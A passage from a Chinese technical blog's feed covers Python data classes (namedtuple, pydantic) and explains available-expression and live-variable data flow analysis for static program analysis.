    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>很多时候我们经常需要处理一条包含多个字段的数据，例如用户（<code>name</code>, <code>age</code>, <code>sex</code>），在将它们写入文件或数据库之前，你会怎么处理它们的存储？最开始的时候，我采用元组和列表，不同索引位置的值代表不同的字段，并将它们存储在一个总的列表中，像下面这样：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">datas <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">(</span><span class="token string">'Bob'</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token string">'man'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token string">'women'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>但是很快发现这样结构化的数据可读性并不高，一旦数据字段很多，取出一条数据以后你往往不知道每个位置代表什么。因此，我改用了<code>dict</code> ，新的数据如下：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">datas <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>        <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'Bob'</span><span class="token punctuation">,</span>        <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token number">12</span><span class="token punctuation">,</span>        <span class="token string">'sex'</span><span class="token punctuation">:</span> <span class="token string">'man'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span>        <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'Alice'</span><span class="token punctuation">,</span>        <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token number">15</span><span class="token punctuation">,</span>        <span class="token string">'sex'</span><span class="token punctuation">:</span> <span class="token string">'women'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>的确提高了可读性，并且在数据交付的时候<code>dict</code>与<code>json</code>可以无缝衔接，这样传输数据给别人也很方便。但新的问题在于，<code>dict</code>这个数据结构没有明确指出来这个数据是什么。你只看到：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span>    <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'Bob'</span><span class="token punctuation">,</span>    <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token number">12</span><span class="token punctuation">,</span>    <span class="token string">'sex'</span><span class="token punctuation">:</span> <span class="token string">'man'</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>但他是什么数据类型呢？换句话说，就是缺少一个标签，指明这个数据，一旦我们有多个数据交叉使用，同时需要做类型验证，如用户数据和商品数据在一个管道中，做鉴别筛选的时候，<code>dict</code>就显得力不从心了。由此，数据类就派上用场了。</p><h2 id="namedtuple"><a href="#namedtuple" class="headerlink" title="namedtuple"></a>namedtuple</h2><p>光听名字就知道，这是一个有了名字的元组，它可以同时兼顾元组和字典两者的特性，实现高效的数据存储。</p><h3 id="定义与初始化"><a href="#定义与初始化" class="headerlink" title="定义与初始化"></a><strong>定义与初始化</strong></h3><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> collections <span class="token keyword">import</span> namedtupleobj <span class="token operator">=</span> namedtuple<span class="token punctuation">(</span>typename<span class="token punctuation">,</span> field_names<span class="token punctuation">,</span> verbose<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> rename<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div><ul><li><strong>typename</strong>：元组名称(可以理解为数据类类名)</li><li><strong>field_names</strong>：元组中元素（字段）的名称，有两种传入方式<ul><li>空格隔开的字符串，e.g. <code>&quot;name age sex&quot;</code> </li><li>逗号隔开的序列(<strong>推荐</strong>)，e.g. <code>[&#39;name&#39;,&#39;age&#39;, &#39;sex&#39;]</code></li></ul></li><li><strong>rename</strong>：如果元素名称中含有 python 的关键字，则必须设置为 rename=True</li><li><strong>verbose</strong>：默认就好</li></ul><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>下面的代码给出了<code>namedtuple</code>的基础使用，同时在每一步添加了相应的注释（包括作用和好处），建议仔细阅读</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> collections <span class="token keyword">import</span> namedtupleUser <span class="token operator">=</span> namedtuple<span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'sex'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 这一步相当于定义了一个User类</span>user <span class="token operator">=</span> User<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'Bob'</span><span class="token punctuation">,</span> sex<span class="token operator">=</span><span class="token string">'man'</span><span class="token punctuation">,</span> age<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">)</span>  <span class="token comment"># 实例化对象</span><span class="token keyword">print</span><span class="token punctuation">(</span> user<span class="token punctuation">.</span>_fields <span class="token punctuation">)</span>  <span class="token comment"># 获取所有字段名</span><span class="token comment"># 也可以通过一个序列来创建一个User对象，通过_make方法</span>user <span class="token operator">=</span> User<span class="token punctuation">.</span>_make<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'Bob'</span><span class="token punctuation">,</span> <span class="token string">'man'</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment"># 这个接口的好处在于可以无缝转换序列数据，这比dict要方便</span><span class="token comment"># 获取用户的属性，这种属性的方式相比于`ditc["name"]`，我个人更喜欢一些</span><span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>sex<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token comment"># 修改对象属性，通过_replace方法，如果你非要修改字段内容，记得要返回值，namedtuple本身是不可变的，这是创建了一个新的</span>user <span class="token operator">=</span> user<span class="token punctuation">.</span>_replace<span class="token punctuation">(</span>age<span class="token operator">=</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token comment"># 将User对象转换成字典，通过_asdict方法，实现了和dict之间的无缝衔接</span><span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>_asdict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 新的版本中已经把ordereddict和dict合并了，因此直接返回dict</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><ul><li><strong>多数据处理</strong></li></ul><p>在实际情况中，我们很可能拿到的是一大堆列表数据，现在要基于<code>namedtuple</code>进行转换</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> collections <span class="token keyword">import</span> namedtupleusers <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">(</span><span class="token string">'Bob'</span><span class="token punctuation">,</span><span class="token string">'man'</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token string">'women'</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token string">'CP'</span><span class="token punctuation">,</span> <span class="token string">'superman'</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">)</span><span class="token punctuation">]</span>User <span class="token operator">=</span> namedtuple<span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'sex'</span><span class="token punctuation">,</span><span class="token string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> user <span class="token keyword">in</span> users<span class="token punctuation">:</span>    user <span class="token operator">=</span> User<span class="token punctuation">.</span>_make<span class="token punctuation">(</span>user<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><blockquote><p>在一般的数据处理中，<code>namedtuple</code>已经能够很好地满足基本的数据需求了，但简洁是它的特性，也是它的软肋，例如无法对输入数据类型、数据取值范围进行校验，无法指定可选字段等，因此，我们还需要更awesome的数据类来处理</p></blockquote><h2 id="dataclass-amp-pydantic"><a href="#dataclass-amp-pydantic" class="headerlink" title="dataclass &amp; pydantic"></a>dataclass &amp; pydantic</h2><p><code>dataclass</code>一听名字就知道是专门的数据类，在<code>python3.7</code>的时候被加入到标准库中，使用的时候通过<code>from dataclasses import dataclass</code>即可，虽然它很方便，但由于<code>python3.7</code>之后版本的限制，这里我直接讲一个与之类似的专门的数据类库<code>pydantic</code>（<code>python3.6+</code>）</p><ul><li><strong>安装</strong></li></ul><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">pip install pydantic<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><h3 id="基本使用-1"><a href="#基本使用-1" class="headerlink" title="基本使用"></a>基本使用</h3><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> typing <span class="token keyword">import</span> Optional<span class="token keyword">from</span> pydantic <span class="token keyword">import</span> validator<span class="token keyword">from</span> pydantic<span class="token punctuation">.</span>dataclasses <span class="token keyword">import</span> dataclass<span class="token keyword">from</span> pydantic <span class="token keyword">import</span> BaseModel  <span class="token comment"># class User(BaseModel):   # 也可以通过继承BaseModel的方式初始化</span><span class="token decorator annotation punctuation">@dataclass</span><span class="token punctuation">(</span>frozen<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment"># frozen为True表示数据初始化后不可更改</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">:</span>    name<span class="token punctuation">:</span> <span class="token builtin">str</span>   <span class="token comment"># 指定数据类型</span>    age<span class="token punctuation">:</span> <span class="token builtin">int</span>    sex<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'man'</span>  <span class="token comment"># 设置默认值</span>    address<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span>  <span class="token comment"># 可选字段类型</span>    <span class="token decorator annotation punctuation">@validator</span><span class="token punctuation">(</span><span class="token string">"age"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">age_value_range</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;=</span> v <span class="token operator">&lt;=</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># 年龄不在合理范围内</span>            <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"Age can not be set out of [0,200]"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> v    user1 <span class="token operator">=</span> User<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'GentleCP'</span><span class="token punctuation">,</span> age<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">,</span> sex<span class="token operator">=</span><span class="token string">'man'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>user1<span class="token punctuation">.</span>name<span class="token punctuation">)</span>  <span class="token comment"># GentleCP</span>user2 <span class="token operator">=</span> User<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'CP'</span><span class="token punctuation">,</span> age<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> sex<span class="token operator">=</span><span class="token string">'man'</span><span class="token punctuation">,</span> address<span class="token operator">=</span><span class="token string">'Beijing'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>上面的一个例子基本解释了<code>pydantic</code>的基础使用，但<code>pydantic</code>作为一个强大的数据类接口，自然还有更多的特性，因为很多内容我们实际上也用不到，这里我仅列举常见可能会使用的，如果感兴趣的可以自己去<a href="https://pydantic-docs.helpmanual.io/">官网</a>深入了解。</p><blockquote><p>这里要特别说明一下，虽然<code>BaseModel</code>和<code>dataclass</code>两种方式十分相似，但功能上还是存在差异的，如继承<code>BaseModel</code>的类拥有很多<code>Model</code>属性，如<code>dict(),json(),parse_obj()</code>等，但<code>dataclass</code>是没有的，它只包含必要的数据类型和对数据的验证操作，因此，如果你希望对你的数据有更好的操作，我建议选用<code>BaseModel</code></p></blockquote><h3 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h3><p>用于初始化的时候指定数据的类型，常用的如下：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pydantic <span class="token keyword">import</span> BaseModel<span class="token keyword">from</span> typing <span class="token keyword">import</span> Dict<span class="token punctuation">,</span> List<span class="token punctuation">,</span> Sequence<span class="token punctuation">,</span> Set<span class="token punctuation">,</span> Tuple<span class="token punctuation">,</span> Union<span class="token keyword">class</span> <span class="token class-name">Demo</span><span class="token punctuation">(</span>BaseModel<span class="token punctuation">)</span><span class="token punctuation">:</span>    a<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token comment"># 整型</span>    b<span class="token punctuation">:</span> <span class="token builtin">float</span> <span class="token comment"># 浮点型</span>    c<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token comment"># 字符串</span>    d<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token comment"># 布尔型</span>    e<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span> <span class="token comment"># 整型列表</span>    f<span class="token punctuation">:</span> Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">]</span> <span class="token comment"># 字典型，key为str，value为int</span>    g<span class="token punctuation">:</span> Set<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span> <span class="token comment"># 集合</span>    h<span class="token punctuation">:</span> Tuple<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">]</span> <span class="token comment"># 元组</span>    i<span class="token punctuation">:</span> Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">]</span>  <span class="token comment"># 可以是str或int</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h3 id="字典互转"><a href="#字典互转" class="headerlink" title="字典互转"></a>字典互转</h3><blockquote><p>以下操作基于继承<code>BaseModel</code></p></blockquote><ul><li>传入字典初始化数据</li></ul><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">d <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'name'</span> <span class="token punctuation">:</span> <span class="token string">'CP'</span><span class="token punctuation">,</span>    <span class="token string">'age'</span> <span class="token punctuation">:</span> <span class="token number">15</span><span class="token punctuation">,</span>    <span class="token string">'sex'</span> <span class="token punctuation">:</span> <span class="token string">'man'</span><span class="token punctuation">&#125;</span>user <span class="token operator">=</span> User<span class="token punctuation">(</span><span class="token operator">**</span>d<span class="token punctuation">)</span><span class="token comment"># user = User.parse_obj(d)  # 直接传入字典</span><span class="token comment"># user = User.parse_raw(str(d))  # 解析字符串字典</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><ul><li>数据转换成字典</li></ul><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">user<span class="token punctuation">.</span><span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># user.josn()  # 转换成json数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文主要讲解了<code>python</code>中对数据类的处理，从最开始简单的元组、列表，到更具结构化的字典，再到<code>namedtuple</code>和<code>pydantic</code>，虽然它们一个比一个更强大，但并不意味着所有的场景中都要使用某一个，更好的方案是根据自己的需求去使用，例如如果只是简单的2-3个字段的数据，实际上并没有必要大费周章，直接用一个元组或列表即可，但如果一个数据包含多个字段，且本身具有特殊含义，这时候就要考虑<code>namedtuple</code>或<code>pydantic</code>了。</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>namedtuple</tag>
      
      <tag>pydantic</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【静态分析】数据流分析-Part III</title>
    <link href="/article/21446.html"/>
    <url>/article/21446.html</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上一篇<a href="https://blog.gentlecp.com/article/1676.html">【静态分析】数据流分析-Part II - 求索</a> 对数据流分析中的<code>Live Variables Analysis</code>进行了详解，用于查找<code>used/unused variables</code>，本文继续第三部分内容（也是数据流分析的最后一部分内容）——<code>Available Expression Analysis</code>。主要内容包括：</p><ul><li><code>Available Expression Analysis</code>的定义和理解</li><li><code>Available Expression Analysis</code>算法设计与详解</li><li>举个栗子</li><li>数据流分析中的三种分析方式对比</li><li>总结</li></ul><p>读完本文回对数据流分析<code>Available Expression Analysis</code></p><p>内容有一个初步的了解，解答<strong>是什么，怎么做，效果怎么样</strong>三方面的问题，同时作为最后一篇数据流分析的文章，会将前面两个部分与本文内容做一个整体的总结，以表格形式对比三者，加深对数据流分析三种分析方式的理解。</p><blockquote><p>本文中涉及的一些专业术语或定义可在<a href="https://blog.gentlecp.com/article/19520.html">Part I</a>中找到，强烈建议按顺序阅读前两篇文章，本文不再重复赘述</p></blockquote><h2 id="Available-Expression-Analysis"><a href="#Available-Expression-Analysis" class="headerlink" title="Available Expression Analysis"></a>Available Expression Analysis</h2><p>即可用表达式分析，首先明确分析对象是表达式，类似<code>x op y</code>这种，下面看一下定义：</p><div class="note note-info">            <p>对于给定的一个<code>program point</code> p，表达式可用的前提是：</p><ol><li>所有从<code>entry</code>到p的路径都必须经过对该表达式<code>x op y</code>的执行（也即该路径上必须至少出现一次该表达式）</li><li>在表达式<code>x op y</code> 最后一次执行之后，没有对x，y的重定义</li></ol>          </div><p>用人话解释一下就是，在程序的某一阶段<code>program point p</code>，我们打算直接用某个变量去替代一个表达式了（避免多次计算），这就需要保证该表达式中涉及的变量没有发生变化（前提2），同时所有路径的表达式都要出现过且应该要一致（前提1），这样就能保证该变量与表达式计算的值是一致的。</p><p>看一下下面的例子：</p><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210331111054.png" alt="image-20210331111054673" style="zoom:50%;" /></p><p>程序块输入<code>IN=&#123;a+b&#125;</code>，经过执行<code>a=x op y</code>后，添加新的表达式<code>x op y</code>到输出中，同时因为a被重定义了，所以表达式<code>a+b</code>从集合中去除，最终结果输出<code>OUT=&#123;x op y&#125;</code></p><p>同样，针对<code>Available Expression Analysis</code>，也要明确<code>Abstraction</code>,<code>Transfer Function</code>,<code>Control Flow</code>。</p><h3 id="Abstraction"><a href="#Abstraction" class="headerlink" title="Abstraction"></a>Abstraction</h3><p>对象是表达式，没得说了，假设有表达式<code>E1,E2,...En</code>，则定义1表示<code>available</code>，0表示<code>unavailable</code>，易得<code>bit vector</code>表示：<code>000..000</code></p><h3 id="Transfer-Function"><a href="#Transfer-Function" class="headerlink" title="Transfer Function"></a>Transfer Function</h3><p>在前面的例子中已经体现出了<code>transfer function</code>的核心要点：</p><ol><li>将新的表达式$gen_B$加入输出中</li><li>从输出中去除含重定义变量的表达式$def_B$</li></ol><p>因此，显然有：</p><script type="math/tex; mode=display">OUT[B] = gen_B \bigcup (IN[B]-def_B)</script><p>关于先<code>gen</code>还是<code>kill</code>，就看语句的执行书顺序，例如：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># e.g. 1</span>x <span class="token operator">=</span> x <span class="token operator">+</span> y  <span class="token comment"># 先gen x+y，又因为x被redefined，kill x+y</span><span class="token comment"># e.g. 2</span>a <span class="token operator">=</span> x <span class="token operator">+</span> y  <span class="token comment"># kill a的表达式</span>c <span class="token operator">=</span> a <span class="token operator">+</span> b  <span class="token comment"># 新生成a+b</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h3 id="Control-Flow"><a href="#Control-Flow" class="headerlink" title="Control Flow"></a>Control Flow</h3><p>这一块和之前两种分析方式都不一样了，因为根据定义，所有的path都应该要有该表达式的执行（假设存在一条路径没有，那么一旦执行到这条路径，某变量和表达式的值就不一定相等了），因此从多输出聚合到输入的过程中，应该采用交集：</p><script type="math/tex; mode=display">IN[B] = \bigcap_{P\ a\ predecessor\ of\ B}OUT[P]</script><h2 id="Available-Expression-Analysis-算法设计"><a href="#Available-Expression-Analysis-算法设计" class="headerlink" title="Available Expression Analysis 算法设计"></a>Available Expression Analysis 算法设计</h2><p>有过前面两次的设计经验，这部分应该驾轻就熟了，输入输出都是差不多的，需要特别明确的一点是初始化的部分：</p><ol><li>一开始所有的<code>expression</code>都应该是<code>unavilable</code>，所以对$OUT[entry]=\phi$</li><li>对所有<code>OUT[B]</code>就不一样了，因为前面说到我们要对所有前驱输出做交集得到下一<code>BB</code>的输入，如果初始化的时候前驱<code>BB</code>都是0，那意味着结果一定都为0，这样就没有起到对<code>IN[BB]</code>的更新效果，因此，除<code>entry</code>外的<code>BB</code>初始化$OUT[B] = \cup(1)$</li></ol><p>其他的实际上和<code>Reaching definition analysis</code>没什么差别，循环迭代直到<code>OUT</code>不再产生变化，具体算法描述如下：</p><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210331184554.png" alt="image-20210331184554736"></p><h2 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h2><p>下面通过一个具体的样例来加深对算法过程的理解，与之前一样，受限于文章内容，只给出<strong>初始</strong>和<strong>结束</strong>状态：</p><ul><li><strong>起始</strong>：假设某CFG如下：</li></ul><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210331185623.png" alt="image-20210331185623145"></p><blockquote><p>左上角是程序中出现的表达式</p></blockquote><ul><li><strong>结束</strong></li></ul><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210331185715.png" alt="image-20210331185715022"></p><blockquote><p>整个过程实际上基本上和<code>Reaching Definition Analysis</code>十分相近，只不过在初始化和<code>Transfer Function</code>,<code>Control Flow</code>的表达式上不同</p></blockquote><h2 id="三种分析方式对比"><a href="#三种分析方式对比" class="headerlink" title="三种分析方式对比"></a>三种分析方式对比</h2><p>下图展示了<code>Reaching Definition Analysis, Live Variables Analysis, Available Expression Analysis</code>三种分析方式的对比：</p><div class="table-container"><table><thead><tr><th></th><th>Reaching Definitions</th><th>Live Variables</th><th>Available Expressions</th></tr></thead><tbody><tr><td><strong>Domain</strong>(分析对象)</td><td>definitions</td><td>variables</td><td>expressions</td></tr><tr><td><strong>Direction</strong>(分析方向)</td><td>forward</td><td>backward</td><td>forward</td></tr><tr><td><strong>May/Must</strong>(存在/全部)</td><td>may</td><td>may</td><td>must</td></tr><tr><td><strong>Boundary</strong>(边界)</td><td>$OUT[entry]=\phi$</td><td>$IN[exit]=\phi$</td><td>$OUT[entry]=\phi$</td></tr><tr><td><strong>Initialization</strong>(初始化)</td><td>$OUT[B]=\phi$</td><td>$IN[B]=\phi$</td><td>$OUT[B]=\cup$</td></tr><tr><td><strong>Transfer Function</strong></td><td>$OUT[B]=gen_B\bigcup(IN[B]-kill_B)$</td><td>$IN[B]=use_B\bigcup(IN[B]-def_B)$</td><td>$OUT[B]=gen_B\bigcup(IN[B]-def_B)$</td></tr><tr><td><strong>Meet</strong>($\cup/\cap$)</td><td>$\cup$</td><td>$\cup$</td><td>$\cap$</td></tr></tbody></table></div><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文着重讲解了数据流分析中的<code>Available Expression Analysis</code>，包括其<strong>定义与理解，分析过程（算法），实际例子</strong>，该分析使得在编译优化的过程中可以避免对大量表达式进行重复计算，大大提升程序效率，文末还对现有的三种分析方式进行了对比。</p><p>至此，数据流分析的三种分析已经全部结束，当然这些尚处于理论层次的理解，还需要通过实际的动手分析锻炼后才能将这些内容融会贯通，后续会添加我的手动实践笔记到博客中。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><sup><a href="#fn_1" id="reffn_1">1</a></sup> : <a href="https://www.bilibili.com/video/av97277892/?spm_id_from=333.788.b_765f64657363.3">南京大学《软件分析》课程04（Data Flow Analysis II）_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>static_analysis</tag>
      
      <tag>available_expression_analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【静态分析】数据流分析-Part II</title>
    <link href="/article/1676.html"/>
    <url>/article/1676.html</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上一篇<a href="https://blog.gentlecp.com/article/19520.html">【静态分析】数据流分析-Part I - 求索</a>对数据流分析中的<code>Reaching Definition Analysis</code>中进行了详解，用于发现<code>undefined variables</code>，本文继续第二部分内容——<code>Live Variables Analysis</code>。主要内容包括：</p><ul><li><code>Live Variables Analysis</code>的定义和理解</li><li><code>Live Variables Analysis</code>算法设计与详解</li><li>举个栗子</li><li>总结</li></ul><p>读完本文会对数据流分析<code>Live Variables Analysis</code>内容有一个初步的了解，解答包括<strong>是什么，怎么做，效果怎么样</strong>三方面的问题。</p><blockquote><p>本文中涉及的一些专业术语或定义可在上一篇<code>Part I</code>中找到，强烈建议先阅读上一篇文章，本文不再重复赘述</p></blockquote><h2 id="Live-Variables-Analysis"><a href="#Live-Variables-Analysis" class="headerlink" title="Live Variables Analysis"></a>Live Variables Analysis</h2><p>从名字翻译过来是对存储变量的分析，自然而然要引出定义<strong>什么是<code>Live</code>，什么是<code>Dead</code></strong>。</p><div class="note note-info">            <p>对于明确给定的的一个<code>program point</code> p，如果存在一条执行路径，在该路径上<code>Variable v</code>被使用过（如<code>a = v</code>），则认为<code>v</code>是<code>live</code>，否则就是<code>dead</code></p>          </div><p>换成人话就是如果没被使用过的变量就是<code>dead</code>(没用的变量)，就好比初始化了一个变量<code>v</code>，然而后面的程序就没<code>v</code>什么事了，那这个<code>v</code>等于<code>dead</code></p><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210327143037.png" alt="image-20210327143037134"></p><blockquote><p>注意在该路径上<code>v</code>不应该被重新定义</p></blockquote><p>那<code>Live Variables Analysis</code>有什么作用呢？</p><p>一个常见的场景是当程序需要对某些变量进行计算，同时寄存器已经满了的时候，就可以将<code>dead</code>的变量从寄存器中替换掉。</p><p><code>Live Variables Analysis</code>与<code>Reaching Definition Analysis</code>的分析不同的一点是采用了<code>backward</code>的分析方式，也就是自底向上（倒着分析），这一点需要解释一下：</p><ul><li><p><strong>为什么采用<code>backward</code>的分析方式</strong>：假设<code>forward</code>分析，对于<code>pogram point p</code>要确认v是否<code>live</code>的前提是找到一个v被使用的语句，并且一直要算到<code>exit</code>,这也就意味着，在执行到<code>exit</code>之前，都要保留<code>p</code>这个位置关于<code>v</code>的信息，这意味着对一个变量v需要一个一维数组保留其到<code>exit</code>前所有的状态，对于多个v，那就需要<strong>二维数组</strong>来存储。</p><p>但如果是<code>backward</code>，只要发现v被使用的情况，只需要找前面最近的一条对于v的<code>definition</code>匹配上即可，因此这个过程中可以用<strong>一维的数组</strong>存储所有的变量，当匹配到相应<code>definition</code>就认定该变量对该<code>program point p</code>是<code>live</code>的。</p></li></ul><p>后面依然针对<code>Abstraction</code>,<code>Transfer Function</code>,<code>Control Flow</code>三个部分依次实现。</p><h3 id="Abstraction"><a href="#Abstraction" class="headerlink" 